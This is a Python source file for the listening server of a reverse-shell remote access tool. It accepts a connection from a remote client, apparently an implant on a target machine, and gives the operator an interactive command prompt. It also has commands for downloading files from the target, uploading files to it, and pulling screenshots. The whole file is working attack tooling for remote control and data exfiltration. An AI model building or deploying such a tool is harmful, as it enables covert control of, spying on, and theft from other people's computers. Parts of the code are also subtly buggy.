import socket
import os
import platform
# import json
import base64
# import pickle


HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222

server = socket.socket()
server.bind((HOST, PORT))

print('+ Server Started')
print('+ Listening for incoming connections ...')
server.listen(5)
client, client_addr = server.accept()
print(f'+ {client_addr} connected to the server')

# RELIABLE SEND
# -----------------------------------
def send(data):
    # WORKING
    # -----------------------------------
    try:
        data = data.encode()
    except AttributeError:
        pass
    client.send(data)

    # TRY 2
    # -----------------------------------
    # msg = pickle.dumps(data)
    # client.send(msg)

    # WANTED TO MAKE IT BETTER AND FAILED
    # -----------------------------------
    # jd = json.dumps(data)
    # client.send(jd.encode())

# RELIABLE RECIEVE
# -----------------------------------
def recv():
    # WORKING
    # -----------------------------------
    output = client.recv(16834)
    output = output.decode()
    return output

    # TRY 2
    # -----------------------------------
    # jrd = ""
    # while True:
    #     try:
    #         jrd = jrd + pickle.loads(client.recv(16834))
    #         return jrd
    #     except:
    #         continue

    # WANTED TO MAKE IT BETTER AND FAILED
    # -----------------------------------
    # jrd = b""
    # while True:
    #     try:
    #         jrd = jrd + client.recv(1024)
    #         return json.loads(jrd)
    #     except ValueError:
    #         break

# SHELL SERVER
# -----------------------------------
count = 1
def shell():
    global count
    while True:
        command = input(f'+ Shell#~{client_addr}: ')
        send(command)
        print(f'Sent command {command}')

        if command == "rsq":
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue

        elif command[:8] == "download":
            with open(command[9:], "wb") as file: # wb to get any file ( mp4, pptx, mp3, jpg, everything )
                result = recv()
                file.write(base64.b64decode(result))
        
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to Upload"
                send(base64.b64encode(failed))
        
        elif command[:10] == "screenshot":
            try:
                with open("screenshot%d" % count, "wb") as screen:
                    image = recv()
                    image_decoded = base64.b64decode(image)
                    if image_decoded[:4] == "[!!]":
                        print(image_decoded)
                    else:
                        screen.write(image_decoded)
                        count += 1
            except:
                print("[!!] Failed to get screenshot")

        result = recv()
        print(result)
    

shell()

